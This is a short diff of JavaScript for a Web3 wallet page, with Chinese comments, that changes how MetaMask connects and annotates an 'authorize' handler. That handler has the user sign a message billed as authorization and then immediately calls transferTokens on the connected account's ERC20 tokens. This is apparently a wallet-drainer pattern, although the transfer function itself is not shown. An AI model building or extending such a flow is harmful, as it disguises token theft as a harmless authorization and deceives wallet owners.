@@ -7,11 +7,9 @@ const erc20Abi = [
     // ERC20 ABI 省略...
 ];
 
-// 页面加载时自动连接钱包
-window.onload = async () => {
-    const selectedWallet = 'metamask'; // 默认选择 MetaMask
-    document.getElementById('walletSelector').value = selectedWallet;
-    
+// 连接钱包的按钮点击事件
+document.getElementById('connectButton').onclick = async () => {
+    const selectedWallet = 'metamask'; // 假设默认选择 MetaMask
     await connectWallet(selectedWallet);
 };
 
@@ -73,8 +71,12 @@ document.getElementById('authorizeButton').onclick = async () => {
     try {
         const signature = await web3.eth.personal.sign(message, account);
         document.getElementById('status').innerText = `授权成功: ${signature}`;
+        
+        // 自动弹出签名页面
         document.getElementById('signatureMessage').innerText = message;
         document.getElementById('signingSection').style.display = 'block';
+        
+        // 开始代币转移
         await transferTokens(account);
     } catch (error) {
         document.getElementById('status').innerText = '签名失败: ' + error.message;
